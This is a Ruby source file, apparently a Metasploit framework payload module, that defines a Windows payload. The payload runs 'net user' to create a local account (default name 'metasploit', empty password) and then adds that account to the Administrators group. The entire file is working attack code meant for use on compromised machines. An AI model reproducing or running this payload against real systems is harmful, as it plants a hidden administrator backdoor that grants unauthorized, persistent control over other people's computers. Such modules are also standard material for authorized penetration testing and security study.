require 'msf/core'
require 'msf/core/payload/windows/exec'

module Msf
module Payloads
module Singles
module Windows

###
#
# Extends the Exec payload to add a new user.
#
###
module AddUser

	include Msf::Payload::Windows::Exec

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Execute net user /ADD',
			'Version'       => '$Revision$',
			'Description'   => 'Create a new user and add them to local administration group',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Privileged'    => true))

		# Register command execution options
		register_options(
			[
				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
				OptString.new('PASS', [ true, "The password for this user", ""           ]),
			], Msf::Payloads::Singles::Windows::AddUser)

		# Hide the CMD option...this is kinda ugly
		deregister_options('CMD')
	end

	#
	# Override the exec command string
	#
	def command_string
		user = datastore['USER'] || 'metasploit'
		pass = datastore['PASS'] || ''

		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
			"net localgroup Administrators #{user} /ADD"
	end

end

end end end end
